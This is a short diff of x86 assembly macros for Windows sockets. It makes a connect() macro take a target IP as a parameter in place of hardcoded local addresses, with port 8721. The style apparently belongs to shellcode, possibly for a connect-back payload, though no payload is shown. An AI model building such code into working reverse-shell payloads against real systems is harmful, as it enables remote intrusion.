@@ -184,12 +184,11 @@ LWSAStartup:                    ; WSAStartup (0x190, DATA)
 ;   result in eax
 ; preserves ebp, esp, ebx, esi
 ; preserves stack if %1 == 1
-%macro WSA_CALL_CONNECT 1
+; %2 should be the ip (in string form.)
+%macro WSA_CALL_CONNECT 2
 
 LConnect:            ; connect(edi, sockaddr, 16)
-    ;push 0xf401a8c0 ; 192.168.1.244
-    ;push 0xbb32a8c0 ; 192.168.50.187
-    push 0x0100007f ; host: 127.0.0.1
+    INET_ADDR {push dword}, %2
     push 0x11220002 ; port: 8721 
     mov ecx, esp
     push BYTE 0x10
